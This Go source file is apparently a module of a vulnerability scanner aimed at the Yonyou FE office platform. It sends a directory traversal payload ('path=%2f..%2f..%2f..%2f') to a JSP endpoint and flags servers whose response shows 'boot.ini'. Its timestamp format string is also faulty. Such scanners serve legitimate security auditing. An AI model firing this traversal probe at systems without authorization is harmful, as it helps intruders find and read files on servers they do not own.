package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io"
	"log"
	"net/http"
	"strings"
	"time"
)

func TemplateOfTaohong_managerScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	templateOfTaohong_manager := "用友 FE协作办公平台 templateOfTaohong_manager目录遍历漏洞"
	urls := address + "/system/mediafile/templateOfTaohong_manager.jsp?path=%2f..%2f..%2f..%2f"
	response, err := client.Get(urls)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, templateOfTaohong_manager)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, templateOfTaohong_manager)
		}
		return
	}
	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%sERROR%s] %s 读取响应体失败: %v", Cyan, currentTime, Reset, Red, Reset, templateOfTaohong_manager, err)
		fmt.Println(output)
		return
	}

	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "boot.ini") {
		result6 := templateOfTaohong_manager + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result6, filename) // 保存结果到文本文件
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Green, currentTime, Reset, Green, Reset, templateOfTaohong_manager, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, templateOfTaohong_manager, response.StatusCode)
		fmt.Println(output)
	}
}
